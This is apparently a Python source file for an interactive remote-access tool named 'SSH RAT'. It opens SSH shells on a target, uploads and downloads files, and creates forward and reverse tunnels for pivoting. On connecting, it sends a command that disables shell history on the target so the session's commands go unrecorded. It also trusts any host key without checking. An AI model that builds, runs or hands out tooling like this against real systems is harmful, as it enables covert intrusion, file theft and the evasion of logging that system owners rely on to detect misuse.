#!/usr/bin/env python3
import argparse
import paramiko
import threading
import prettytable
import scp
import cmd2
import os
import sys
from datetime import datetime
from tunnels import ForwardTunnel, ReverseTunnel, Tunnel

# TODO
# - Download/Upload to relative path
# - Fix prompts

def print_info(msg):
    print ("[*] {}".format(msg))

def print_success(msg):
    print ("[+] {}".format(msg))

def print_failure(msg):
    print ("[-] {}".format(msg))

def print_warning(msg):
    print ("[!] {}".format(msg))


class SSHSession():

    shell = None
    scp = None
    client = None
    transport = None

    host = None
    port = None
    un = None
    pw = None
    ident = None

    def __init__(self, host, port, un, pw, log_file = None, ident=None):
        self.host = host
        self.port = port
        self.un = un
        self.pw = pw
        self.ident = ident
        self.log_file = log_file

    def connect(self):
        try:
            self.client = paramiko.client.SSHClient()
            self.client.set_missing_host_key_policy(paramiko.client.AutoAddPolicy())
            self.client.connect(self.host, username=self.un, password=self.pw, look_for_keys=False)
        except:
            raise

        try:
            self.transport = paramiko.Transport((self.host, self.port))
            self.transport.connect(username=self.un, password=self.pw)
        except:
            raise

        thread = threading.Thread(target=self.process_data)
        thread.daemon = True
        thread.start()

    def disconnect(self):
        if(self.client != None):
            self.scp.close()
            self.client.close()
            self.transport.close()

    def create_shell(self):
        self.shell = self.client.invoke_shell()

    def create_scp(self):
        self.scp = scp.SCPClient(self.client.get_transport(), progress=self.progress)

    def get_file(self, remote_path, local_path, recursive=False):
        self.scp.get(remote_path, local_path, recursive)

    def put_file(self, local_path, remote_path, recursive=False):
        try:
            self.scp.put(local_path, remote_path,recursive)
        except Exception as e:
            print(e)
            raise

    def send_command(self, command):
        if(self.shell):
            self.log_file.write(command)
            self.shell.send(command + "\n")
        else:
            raise Exception("Shell not opened.")

    def process_data(self):
        while True:
            if self.shell != None and self.shell.recv_ready():
                alldata = self.shell.recv(1024)
                while self.shell.recv_ready():
                    alldata += self.shell.recv(1024)
                strdata = str(alldata, "utf8")
                strdata.replace('\r', '')

                self.log_file.write(strdata)
                print(strdata, end = "")
    
    def progress(self, filename, size, sent):
        sys.stdout.write("Progress: %.2f%%   \r" % (float(sent)/float(size)*100) )

        if size==sent:
            print()
            print_success("Transfer complete!")

## Arg Parsers

# put
put_parser = argparse.ArgumentParser()
put_parser.add_argument('-r', '--recursive', action='store_true', help="Upload an entire directory")
put_parser.add_argument('local_path', help="File/directory to upload")
put_parser.add_argument('remote_path', nargs='?', default='.', help="Location to upload to. Default is current directory")

# get
get_parser = argparse.ArgumentParser()
get_parser.add_argument('-r', '--recursive', action='store_true', help="Download an entire directory")
get_parser.add_argument('remote_path', help="File/directory to download")
get_parser.add_argument('local_path', nargs='?', default='DOWNLOAD_DIR', help="Location to download to. Default is the set download_dir")

# tunnel
tun_parser = argparse.ArgumentParser()
subparsers = tun_parser.add_subparsers(dest="option")

list_group = subparsers.add_parser('list')
delete_group = subparsers.add_parser('del')
create_group = subparsers.add_parser('add')

delete_group.add_argument('index', type=int, help="Index of tunnel to remove")

create_group.add_argument('-r', '--reverse', action='store_true', help="Make a reverse tunnel")
create_group.add_argument('-l', '--lhost', type=str, default='0.0.0.0', help="Listen on a specified interface. Otherwise, 0.0.0.0")
create_group.add_argument('lport', type=int, help="Port to listen on")
create_group.add_argument('dhost', type=str, help="Destination host to sent to")
create_group.add_argument('dport', type=int, help="Destination port to send to")

# connect

connect_parser = argparse.ArgumentParser()
connect_parser.add_argument('-u', '--username', type=str, help="Username")
connect_parser.add_argument('-p', '--password', type=str, help="Password")
connect_parser.add_argument('host', type=str, help="Target host")
connect_parser.add_argument('port', type=int, default=22, help="Port to connect to")

class SSHRat(cmd2.Cmd):
    intro = '>> SSH RAT >>\n'
    default_prompt = 'SSHRAT> '
    prompt = default_prompt 

    def __init__(self):
        super().__init__()
        
        self.debug = True
        self.ssh = None
        self.tunnels = None
        self.log_file = None

        self.download_dir = f"{os.getcwd()}{os.path.sep}logs"
        self.add_settable(cmd2.Settable('download_dir', str, 'Default destination location of downloaded files'))

    ## helpers 

    def run_initial_commmands(self):
        self.ssh.send_command("unset HISTFILE && export HISTSIZE=0 && export HISTFILESIZE=0")

    def disconnect(self):
        if self.ssh is not None:
            if len(self.tunnels) > 0:
                print_info("Shutting down tunnels")
                for tun in self.tunnels:
                    self.remove_tunnel(tun)
            
            self.ssh.disconnect()
            self.ssh = None

            self.prompt = self.default_prompt

            self.log_file.close()
            self.log_file = None

            print_success("Disconnected")
        

    def list_tunnels(self):

        tun_table = prettytable.PrettyTable()
        tun_table.field_names = ["#", "Type", "Listening Host", "Listening Port", "Destination Host", "Destination Port"]
        for idx, tun in enumerate(self.tunnels):
            if tun.tun_type == ForwardTunnel:
                ttype = "F"
            else:
                ttype = "R"
            tun_table.add_row([idx, ttype, tun.lhost, tun.lport, tun.dhost, tun.dport])
        print(tun_table)

    def remove_tunnel(self, tun):
        try:
            tun.stop()
            self.tunnels.remove(tun)
            print_success("Tunnel removed")
        except Exception as e:
            print_failure(f"Failed to shutdown tunnel {tun.to_str()} <{e}>")

    def add_tunnel(self, lhost, lport, dhost,dport, reverse=False):

        if reverse:
            tun_type = ReverseTunnel
        else:
            tun_type = ForwardTunnel

        try:
            new_tun = Tunnel(self.ssh.client, tun_type, lhost, lport, dhost, dport)
            if new_tun is not None:
                self.tunnels.append(new_tun)
                print_success(f"Tunnel created {new_tun.to_str()}")
        except Exception as e:
            print_failure(f"Failed to create tunnel {new_tun.to_str()} <{e}>")

    ## functionality

    @cmd2.with_argparser(connect_parser)
    def do_connect(self, args):
        """
        Connect to an SSH Server
        """
        self.host = args.host
        self.port = args.port
        self.un = args.username
        self.pw = args.password

        try:
            log_path = f"{self.download_dir}{os.path.sep}{self.host}-{datetime.now()}"
            self.log_file = open(log_path, 'a+')

            self.ssh = SSHSession(self.host, self.port, self.un, self.pw, log_file=self.log_file)

            print_info("Connecting...")
            self.ssh.connect()
            self.ssh.create_shell()
            self.ssh.create_scp()
            self.run_initial_commmands()
            self.tunnels = []
            self.prompt = ''

            print_info("Session opened")
        except Exception as e:
            print_failure(f"Failed to open session: {e}")

    @cmd2.with_argparser(tun_parser)
    def do__tunnel(self, args):
        """
        Show Tunnels
        """
        if args.option == "list":
            self.list_tunnels()
        elif args.option == "add":
            if args.reverse:
                self.add_tunnel(args.lhost, args.lport, args.dhost, args.dport, reverse=True)
            else:
                self.add_tunnel(args.lhost, args.lport, args.dhost, args.dport, reverse=False)
        elif args.option == "del":
            self.remove_tunnel(self.tunnels[args.index])
        else:
            tun_parser.print_help()

    @cmd2.with_argparser(get_parser)
    def do__get(self, args):
        """
        download a file from target
        """
        if args.local_path == 'DOWNLOAD_DIR':
            local_path = self.download_dir
        else:
            local_path = args.local_path

        print_info(f"Downloading '{args.remote_path}' to '{local_path}'")
        try:
            self.ssh.get_file(args.remote_path, local_path, args.recursive)
        except:
            print_failure("Download failed!")

    @cmd2.with_argparser(put_parser)
    def do__put(self, args):
        """
        upload a file to the target
        """
        print_info("Uploading '{}' to '{}'".format(args.local_path, args.remote_path))
        try:
            self.ssh.put_file(args.local_path, args.remote_path, args.recursive)
        except:
            print_failure("Upload failed!")

    ## usability features

    def do__disconnect(self, args):
        self.disconnect()

    def do__exit(self, args):
        """
        exits everything
        """
        self.disconnect()
        return -1

    def preloop(self):
        """
        Initialization before prompting user for commands.
        Unset histories, etc
        Despite the claims in the Cmd documentaion, Cmd.preloop() is not a stub.
        """
        cmd2.Cmd.preloop(self)   ## sets up command completion

    def postloop(self):
        """
        Cleanup before exiting
        """
        cmd2.Cmd.postloop(self)   ## Clean up command completion
        if self.ssh is not None:
            self.ssh.disconnect()

    def do_shell(self, args):
        """
        Pass command to a system shell when line begins with '!'
        """
        os.system(args)

    def send_command(self, command):
        if self.ssh.shell is None:
            print("No SSH connection")
            return

        self.ssh.send_command(command)

    def default(self, statement):
        """
        Pass this as command to SSH 
        """
        # if len(statement.raw) > 0:
        #     self.send_command(statement.raw)
        if self.ssh is not None:
            self.send_command(statement.raw)
        else:
            pass

if __name__ == "__main__":

    c = SSHRat()
    sys.exit(c.cmdloop())
